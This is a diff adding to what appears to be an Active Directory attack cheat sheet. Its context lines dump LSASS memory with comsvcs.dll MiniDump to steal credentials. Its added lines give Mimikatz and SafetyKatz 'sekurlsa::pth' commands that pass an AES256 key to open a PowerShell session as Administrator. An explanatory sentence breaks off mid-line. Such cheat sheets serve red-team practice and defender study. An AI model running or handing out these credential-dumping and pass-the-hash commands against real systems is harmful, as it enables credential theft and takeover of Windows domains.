@@ -49,6 +49,15 @@ tasklist \FI "IMAGENAME eq lsass.exe"
 rundll32.exe C:\windows\System32\comsvcs.dll ,MiniDump <lsass pid> C:\Users\Public\lsass.dmp full
 ```
 
+__Pass the Hash__
+```powershell
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administartor /domain:example.local /aes256:<aes256Key> /run:powershell.exe"'
+```
+
+```powershell
+safetykatz.exe '"sekurlsa::pth /user:Administartor /domain:example.local /aes256:<aes256Key> /run:powershell.exe"'
+```
+- Above commands starts ps sessions with _logon type 9_ same as 
 
 ---
 ### AsReproasting
